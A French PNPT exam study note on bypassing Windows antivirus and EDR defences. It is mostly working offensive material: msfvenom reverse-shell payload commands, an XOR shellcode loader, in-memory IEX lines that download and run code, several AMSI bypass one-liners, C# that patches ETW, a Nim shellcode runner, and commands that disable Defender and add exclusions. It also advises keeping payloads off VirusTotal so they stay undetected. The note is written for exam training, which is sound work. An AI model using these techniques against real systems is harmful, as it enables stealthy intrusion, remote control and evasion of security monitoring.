---
title: "AV / EDR Evasion (PNPT)"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > PNPT"
tags: [sciences-appliquées, informatique, sécurité, av-evasion, edr, pnpt]
date: "2026-05-18"
---

# AV / EDR Evasion

L'évasion AV/EDR, c'est l'écart entre "j'ai un exploit qui marche en lab" et "j'ai un exploit qui marche contre un Windows réel". À l'examen PNPT, sans bypass, ton premier `reverse.exe` est intercepté avant même de toucher la mémoire — et tu perds plusieurs heures. Cette note explique les mécanismes de défense, puis les contournements, dans l'ordre où on les rencontre.

## Comprendre la défense avant l'évasion

```
   Défense AV/EDR Windows moderne — où chaque couche intercepte

   ┌──────────────────────────────────────────────────────────┐
   │ Fichier sur disque                                       │
   │   ↓                                                      │
   │   ► Scan signature (statique)        ← Defender + AMSI   │
   │   ► Analyse heuristique              ← Behavioral        │
   │   ↓                                                      │
   │ Exécution / lancement                                    │
   │   ↓                                                      │
   │   ► AMSI (PowerShell, VBA, JS)       ← Microsoft Defender│
   │   ► ETW (Event Tracing for Windows)  ← Telemetry         │
   │   ► API hooks (ntdll, kernel32)      ← EDR userland      │
   │   ↓                                                      │
   │ Comportement                                             │
   │   ↓                                                      │
   │   ► Détection comportementale        ← EDR (CrowdStrike, │
   │   ► Cloud sandbox                       SentinelOne...)  │
   └──────────────────────────────────────────────────────────┘
```

Chaque technique d'évasion vise une couche précise. Combiner les techniques est obligatoire pour les EDR modernes.

## Concepts clés

```
Signature-based     : compare le fichier à une base de signatures connues
                      → contournée par obfuscation et chiffrement

Heuristic/Behavioral: analyse les patterns suspects (allocation RWX, etc.)
                      → contournée par execution plus discrète

Sandbox analysis    : exécution dans VM avant validation
                      → contournée par anti-VM (sleeps, environment checks)

AMSI                : interface Windows qui inspecte les scripts (PS, VBA, JS)
                      → contournée par patch en mémoire ou downgrade

ETW                 : tracing pour Defender et EDR
                      → patch en mémoire pour réduire la télémétrie

API hooks           : EDR hooke les Nt* dans ntdll pour observer
                      → direct/indirect syscalls les contournent
```

## Niveau 1 — Obfuscation simple (signatures de base)

Suffit pour Windows Defender basique, pas pour EDR.

```bash
# msfvenom avec encodeur (basique, souvent détecté en 2026)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 \
  -e x64/zutto_dekiru -i 5 -f exe -o payload.exe

# Préférer : générer du shellcode brut et l'encapsuler soi-même
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f raw -o shellcode.bin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f csharp   # pour loader C#
```

**Pourquoi `-i 5` (5 itérations) ne suffit plus** : les signatures couvrent maintenant la structure de l'encodeur, pas juste le shellcode initial. Tu peux faire 50 itérations, Defender détecte toujours.

## Niveau 2 — Chiffrement du shellcode + loader

Le shellcode est chiffré (XOR ou AES) à la compilation, déchiffré en mémoire à l'exécution. La signature statique ne voit que du bruit chiffré.

```python
# XOR simple en Python (à l'encodage)
key = 0x41
encrypted = bytes([b ^ key for b in shellcode])
```

```csharp
// Loader C# minimal
byte[] buf = new byte[] { /* shellcode chiffré */ };
for (int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(buf[i] ^ 0x41);
}
// Puis VirtualAlloc + Marshal.Copy + CreateThread
```

## Niveau 3 — Exécution en mémoire (fileless)

Ne jamais écrire le payload sur disque. Le scanner statique n'a rien à scanner.

```powershell
# Charger et exécuter un script en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/script.ps1')

# Reflection Assembly — charger un .NET en mémoire
$data = (New-Object Net.WebClient).DownloadData('http://10.0.0.1/payload.exe')
[System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)
```

**Limite** : depuis PowerShell 5, AMSI inspecte le contenu téléchargé avant exécution. → niveau 4.

## Niveau 4 — Bypass AMSI

AMSI (Antimalware Scan Interface) inspecte les scripts PowerShell, VBA, JS. Il faut soit le casser, soit le contourner.

```powershell
# Variante 1 — patch en mémoire de amsiInitFailed (souvent signée)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Variante 2 — version obfusquée
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if ($b.Name -like "*siUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};
$f.SetValue($null,$true)

# Variante 3 — patch en mémoire de AmsiScanBuffer (plus stable, nécessite reflection complexe)
# Outils tout-faits : AMSI.fail, Invisi-Shell, AmsiBypass-Reflection

# Variante 4 — downgrade PowerShell v2 (pas d'AMSI)
powershell -version 2
# Nécessite .NET 2.0/3.5 installé sur la cible
```

**À retenir** : les bypass AMSI publiquement connus sont signés rapidement. Générer une variante jetable sur `amsi.fail` ou s'écrire la sienne.

## Niveau 5 — ETW patching

ETW (Event Tracing for Windows) alimente Defender et la plupart des EDR. Le patcher en mémoire réduit la télémétrie.

```csharp
// Patcher EtwEventWrite : faire qu'il retourne immédiatement
IntPtr addr = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
byte[] patch = { 0xC3 };   // ret (instruction x64)
VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out uint old);
Marshal.Copy(patch, 0, addr, patch.Length);
```

Outils prêts : **EtwTi-Bypass**, **SharpBlock**.

## Niveau 6 — Direct/Indirect syscalls (EDR userland)

Les EDR injectent des hooks dans `ntdll.dll` pour observer les appels `Nt*` (NtAllocateVirtualMemory, NtCreateThreadEx, etc.). En appelant les syscalls **directement** (sans passer par ntdll), on contourne ces hooks.

```
   Appel classique :
     VirtualAlloc → ntdll!NtAllocateVirtualMemory → syscall
                          ▲
                          │ HOOK EDR ICI
                          │ (l'EDR voit et enregistre)

   Direct syscall :
     [code custom] → syscall directement (numéro 0x18 sur Win11)
                     ↑
                     pas de hook traversé
```

Outils :
- **SysWhispers2/3** : génère du code C/asm pour direct syscalls
- **HellsGate / HalosGate / TartarusGate** : trouve dynamiquement les numéros de syscall
- **FreshyCalls** : variante moderne avec indirect syscalls

## Niveau 7 — Loaders custom (Nim / Rust / C++)

Compiler son loader en Nim ou Rust donne souvent un binaire avec **moins de signatures** que C# (langages moins courants en malware → moins de patterns détectés).

```nim
# Nim - exemple simplifié avec winim
import winim/lean
var sc = @[byte 0x90, 0x90, ...]   # shellcode déjà déchiffré
var mem = VirtualAlloc(nil, sc.len.SIZE_T, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
copyMem(mem, addr sc[0], sc.len)
discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, nil)
```

Outils tout-faits :
- **Donut** : convertit un EXE/DLL en shellcode positionnable
- **Nimcrypt2, Inceptor, NimPackt** : génération de loaders Nim
- **freeze.rs, ScareCrow** : Rust et autres

## Niveau 8 — Cobalt Strike / Havoc et frameworks C2

Pour le pentest réel (et pour aller au-delà de la PNPT) :
- **Cobalt Strike** : payant, standard de l'industrie offensive
- **Havoc C2** : open-source, modern, bonne évasion intégrée
- **Sliver** : open-source, multiplateforme

À la PNPT, Cobalt Strike n'est pas nécessaire — un loader custom Nim/C# bien fait suffit.

## Contournement egress (filtrage réseau sortant)

Si le réseau bloque certains ports en sortie :

```bash
# Utiliser des ports couramment autorisés
# 443 (HTTPS), 80 (HTTP), 53 (DNS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o shell.exe

# Tunnel DNS — si seul DNS sort
# dnscat2, iodine

# Tunnel HTTP/HTTPS reverse — Havoc / Cobalt Strike intègrent ça nativement
```

```powershell
# Tester quels ports sortent depuis une cible (sans nmap)
1..1024 | % {
  $tcp = New-Object Net.Sockets.TcpClient
  try { $tcp.Connect("10.0.0.1", $_); "$_ open" } catch { }
  $tcp.Close()
}
```

## Defender exclusions (après admin)

Une fois SYSTEM/admin, on peut blanchir des chemins/extensions. C'est bruyant (visible dans les logs), mais utile pour la persistance.

```powershell
# Lister les exclusions actuelles
Get-MpPreference | Select-Object -Property Exclusion*

# Ajouter une exclusion
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Désactiver Real-Time Monitoring (très bruyant — déclenche des alertes)
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Workflow recommandé pour la PNPT

```
   1. Générer du shellcode raw avec msfvenom (-f raw)
   2. Chiffrer le shellcode (AES ou XOR avec clé suffisamment longue)
   3. Embarquer dans un loader Nim ou C# avec :
        - Déchiffrement en mémoire
        - VirtualAlloc + CreateThread
   4. Tester sur une VM Windows avec Defender à jour
   5. Si détecté → ajouter AMSI bypass + ETW patch
   6. Si toujours détecté → recompiler avec strings différentes
   7. JAMAIS upload sur VirusTotal (partage avec éditeurs)
```

## Pièges courants

- **VirusTotal partage les samples avec tous les éditeurs** : ton payload est grillé en quelques heures. Utiliser AnyRun (avec mode privé) ou tester en VM locale.
- **Encoder ≠ bypass** : `-e x64/zutto_dekiru -i 50` ne suffit plus depuis 2018. Defender détecte la structure même de l'encodeur.
- **AMSI bypass de stackoverflow** : tous signés. Régénérer une variante jetable à chaque session sur `amsi.fail`.
- **PowerShell v2 downgrade** : nécessite que .NET 2.0/3.5 soit installé. Pas toujours le cas sur Windows 11.
- **Direct syscalls sans randomization** : les numéros de syscall changent entre versions Windows. Utiliser HellsGate (résolution dynamique) plutôt que des numéros hardcodés.
- **Loader compilé sur Linux pour cible Windows** : peut introduire des artefacts détectables. Préférer compiler dans un environnement Windows propre.
- **Defender exclusions visibles** : ajouter des exclusions trigge l'event ID 5007. Un admin sécurité peut détecter immédiatement. Préférer la furtivité quand possible.
